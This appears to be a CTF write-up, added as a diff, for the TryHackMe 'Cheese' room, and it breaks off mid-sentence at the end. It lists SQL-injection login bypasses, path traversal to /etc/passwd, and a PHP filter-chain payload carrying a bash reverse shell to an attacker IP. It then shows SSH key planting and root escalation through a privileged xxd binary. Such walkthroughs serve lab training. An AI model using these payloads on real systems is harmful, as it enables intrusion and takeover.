@@ -1,0 +1,178 @@
+[(link to room)](https://tryhackme.com/r/room/cheesectfv10)
+
+**Initial Nmap Scan:**
+----------------------
+
+-   Start with an Nmap scan to identify open ports:
+
+    ```
+    nmap -sV 10.10.124.58
+
+    ```
+
+-   We see a large number of ports open, including **FTP**, **SSH**, **Telnet**, **SMTP**, and **HTTP** servers.
+
+**Accessing the HTTP Server:**
+------------------------------
+
+-   Navigate to the HTTP server on port 80, where we find a website for "Cheese."
+
+Cheese website
+--------------
+
+-   After inspection, we find a simple, unencrypted **login page**, identified using Burp Suite's scanner.
+
+Login page
+----------
+
+**SQL Injection Attempt:**
+
+-   Let's attempt a simple SQL injection on the login page. I first tried:
+
+    ```
+    ' OR 1=1 -- --
+
+    ```
+
+-   But this didn't work, indicating some content filtering is in place. Let's switch to:
+
+```
+		' || 1=1
+
+```
+
+-   Success! We find a hidden **admin panel**.
+
+**File Inclusion Exploit:**
+---------------------------
+
+-   From the URL, we can see the parameter `file` is retrieving content. We attempt directory traversal using:
+
+```
+../../../etc/passwd
+
+```
+
+-   The system allows us to enumerate files! We now plan a **File Inclusion exploit**.
+
+**Generating Reverse Shell Payload:**
+-------------------------------------
+
+-   Using a tool called [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator), we generate a reverse shell payload:
+
+```
+python3 php_filter_chain_generator.py --chain "<?php exec(\\"/bin/bash -c 'bash -i >& /dev/tcp/10.8.21.88/9999 0>&1'\\"); ?>" | grep "^php" > payload.txt
+
+```
+
+-   Once we have the contents of `payload.txt`, we append it to the URL:
+
+```
+<http://10.10.220.223/secret-script.php?file=[payload]>
+
+```
+
+**Netcat Reverse Shell:**
+-------------------------
+
+-   Run **Netcat** to establish a connection:
+
+```
+nc -lvnp 9999
+
+```
+
+-   The reverse shell connects, and after navigating through the system, we find a user named `comte`.
+
+**Accessing Comte's Account via SSH:**
+--------------------------------------
+
+-   We see the `ssh/authorized_keys` file allows write access. So, we create an SSH key pair:
+
+```
+ssh-keygen -t rsa -b 2048 -f ~/my_ssh_key
+
+```
+
+-   Copy the public key and add it to the server's authorized keys file for `comte`:
+
+```
+sudo echo "[public_key]" >> /.ssh/authorized_keys
+
+```
+
+-   Connect to `comte`'s account via SSH:
+
+```
+ssh -i my_ssh_key comte@[IP]
+
+```
+
+-   Success! Now you have access to the `user.txt` flag.
+
+**Escalating to Root:**
+-----------------------
+
+-   To find root privileges, list available binaries and services with `sudo -l`. We notice the service **exploit.timer**.
+-   Attempt to start it:
+
+```
+systemctl start exploit.timer
+
+```
+
+-   The error indicates a missing start timer. We modify the file, save it, and restart the service:
+
+```
+systemctl status exploit.timer
+
+```
+
+-   With the service running, navigate to `/opt/`, where we find the `xxd` binary with root privileges.
+
+**GTFObins and xxd:**
+---------------------
+
+-   Visit [GTFOBins](https://gtfobins.github.io/gtfobins/xxd/) to understand how to exploit `xxd`. Using this method, we add our SSH key to root's authorized keys:
+
+```
+echo "[key]" | xxd | /opt/xxd -r - "/root/.ssh/authorized_keys"
+
+```
+
+-   Now connect as `root` using SSH:
+
+```
+ ssh -i my_ssh_key root@10.10.220.223
+
+```
+
+Voila! You now have root access.
+
+An Alternate (Longer) Approach
+==============================
+
+**Gobuster Scan:**
+------------------
+
+-   Run a Gobuster directory scan to enumerate additional files:
+
+```
+gobuster dir -u <http://10.10.124.58> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,html,css
+
+```
+
+-   the scan shows
+
+```
+/index.html           (Status: 200)
+/login.css            (Status: 200)
+/login.php            (Status: 200)
+/users.html           (Status: 200)
+/messages.html        (Status: 200)
+
+```
+
+**Investigating Pages:**
+
+-   The `orders.html` and `users.html` files aren't too interesting. However, **messages.html** stands out. Click on the link to see:s
